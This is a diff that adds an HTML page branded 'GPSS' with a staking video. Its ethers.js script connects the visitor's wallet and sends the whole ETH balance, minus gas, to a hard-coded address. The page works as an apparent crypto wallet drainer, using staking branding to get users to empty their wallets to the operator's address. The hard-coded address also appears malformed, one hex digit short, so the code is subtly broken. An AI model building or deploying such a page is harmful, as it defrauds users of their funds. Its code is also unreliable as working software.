@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ETH Transfer - GPSS</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body class="transfer">
+    <!-- Background video -->
+    <video autoplay muted loop id="background-video">
+        <source src="STAKING.mp4" type="video/mp4">
+        Your browser does not support the video tag.
+    </video>
+
+    <div class="container">
+        <h1>Transfer All ETH</h1>
+        <p>Send all Ethereum (minus gas fees) from your connected wallet to our address.</p>
+
+        <button id="connectButton" onclick="connectWallet()">Connect Wallet</button>
+        <button id="sendButton" onclick="sendAllEth()" disabled>Send All ETH</button>
+        <button onclick="window.location.href='index.html'">Home</button>
+
+        <div id="status">Wallet not connected</div>
+    </div>
+
+    <!-- Use reliable CDN for ethers.js v5.7.2 -->
+    <script src="https://unpkg.com/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+    <script>
+        let provider;
+        let signer;
+        let userAddress;
+
+        // Initialize page
+        window.onload = async () => {
+            if (typeof ethers === 'undefined') {
+                updateStatus('Failed to load ethers.js. Please refresh the page or try again later.');
+                console.error('Ethers.js not loaded');
+                return;
+            }
+            await checkWalletConnection();
+            if (window.ethereum) {
+                window.ethereum.on('accountsChanged', async () => {
+                    await checkWalletConnection();
+                });
+                window.ethereum.on('chainChanged', async () => {
+                    await checkWalletConnection();
+                });
+            } else {
+                updateStatus('Please install MetaMask or use a Web3-compatible browser.');
+            }
+        };
+
+        // Check if wallet is connected and update UI
+        async function checkWalletConnection() {
+            const connectButton = document.getElementById('connectButton');
+            const sendButton = document.getElementById('sendButton');
+            const statusDiv = document.getElementById('status');
+
+            try {
+                if (!window.ethereum) {
+                    updateStatus('Please install MetaMask or use a Web3-compatible browser.');
+                    connectButton.disabled = true;
+                    sendButton.disabled = true;
+                    return;
+                }
+
+                provider = new ethers.providers.Web3Provider(window.ethereum);
+                const accounts = await provider.listAccounts();
+
+                if (accounts.length > 0) {
+                    userAddress = accounts[0];
+                    signer = provider.getSigner();
+                    connectButton.textContent = `Connected: ${userAddress.slice(0, 6)}...${userAddress.slice(-4)}`;
+                    connectButton.disabled = true;
+                    sendButton.disabled = false;
+                    updateStatus(`Connected to ${await getNetworkName()}`);
+                } else {
+                    connectButton.textContent = 'Connect Wallet';
+                    connectButton.disabled = false;
+                    sendButton.disabled = true;
+                    updateStatus('Wallet not connected');
+                }
+            } catch (error) {
+                console.error('Error checking wallet connection:', error);
+                updateStatus('Error connecting to wallet: ' + error.message);
+                connectButton.disabled = false;
+                sendButton.disabled = true;
+            }
+        }
+
+        // Helper to update status div
+        function updateStatus(message) {
+            document.getElementById('status').textContent = message;
+        }
+
+        // Get network name for display
+        async function getNetworkName() {
+            try {
+                const network = await provider.getNetwork();
+                const chainId = network.chainId;
+                const networkNames = {
+                    1: 'Ethereum Mainnet',
+                    5: 'Goerli Testnet',
+                    11155111: 'Sepolia Testnet'
+                };
+                return networkNames[chainId] || `Unknown Network (Chain ID: ${chainId})`;
+            } catch (error) {
+                console.error('Error getting network:', error);
+                return 'Unknown Network';
+            }
+        }
+
+        // Connect to wallet
+        async function connectWallet() {
+            try {
+                if (!window.ethereum) {
+                    alert('Please install MetaMask or use a Web3-compatible browser.');
+                    return;
+                }
+
+                // Request account access
+                await window.ethereum.request({ method: 'eth_requestAccounts' });
+                await checkWalletConnection();
+            } catch (error) {
+                console.error('Wallet connection error:', error);
+                if (error.code === 4001) {
+                    updateStatus('Connection rejected by user.');
+                    alert('Wallet connection was rejected.');
+                } else if (error.code === -32002) {
+                    updateStatus('Please unlock MetaMask or check for pending requests.');
+                    alert('MetaMask is locked or has a pending request. Please unlock it.');
+                } else {
+                    updateStatus('Failed to connect wallet: ' + error.message);
+                    alert('Failed to connect wallet: ' + error.message);
+                }
+            }
+        }
+
+        // Send all ETH to the target wallet
+        async function sendAllEth() {
+            const statusDiv = document.getElementById('status');
+            const sendButton = document.getElementById('sendButton');
+
+            // Confirmation prompt
+            const confirmed = confirm('Are you sure you want to send all ETH (minus gas fees) to the target wallet? This action cannot be undone.');
+            if (!confirmed) {
+                updateStatus('Transfer cancelled by user.');
+                return;
+            }
+
+            // Target wallet address
+            const targetWallet = "0x57CBA93A8f0abC01695917BD1c3f569217Ab203";
+
+            // Validate target wallet address
+            try {
+                const normalizedAddress = ethers.utils.getAddress(targetWallet);
+                console.log('Normalized target address:', normalizedAddress);
+            } catch (error) {
+                console.error('Invalid target address:', targetWallet, error);
+                updateStatus('Invalid target wallet address configured.');
+                alert('Invalid target wallet address. Please contact support.');
+                return;
+            }
+
+            try {
+                // Allow testnets for testing (comment out for production)
+                const network = await provider.getNetwork();
+                const chainId = network.chainId;
+                // Uncomment for production to restrict to Mainnet
+                // if (chainId !== 1) {
+                //     updateStatus(`Please switch to Ethereum Mainnet (Current: ${await getNetworkName()})`);
+                //     return;
+                // }
+
+                // Get balance and estimate gas
+                const balance = await provider.getBalance(userAddress);
+                const gasPrice = await provider.getGasPrice();
+                const gasLimit = 21000; // Standard transfer gas limit
+                const gasCost = gasPrice.mul(gasLimit);
+
+                if (balance.lte(gasCost)) {
+                    updateStatus('Insufficient ETH balance for transfer (including gas fees).');
+                    alert('Insufficient ETH balance for transfer (including gas fees).');
+                    return;
+                }
+
+                // Calculate max amount (balance minus gas cost)
+                const weiAmount = balance.sub(gasCost);
+
+                // Send transaction
+                sendButton.disabled = true;
+                updateStatus('Initiating transaction... Please confirm in MetaMask.');
+
+                const tx = await signer.sendTransaction({
+                    to: targetWallet,
+                    value: weiAmount
+                });
+
+                updateStatus(`Transaction sent! Hash: ${tx.hash}`);
+                await tx.wait();
+                updateStatus(`Transaction confirmed! Sent ${ethers.utils.formatEther(weiAmount)} ETH.`);
+                sendButton.disabled = false;
+
+            } catch (error) {
+                console.error('Transfer error:', error);
+                updateStatus('Transfer failed: ' + error.message);
+                sendButton.disabled = false;
+            }
+        }
+    </script>
+</body>
+</html>
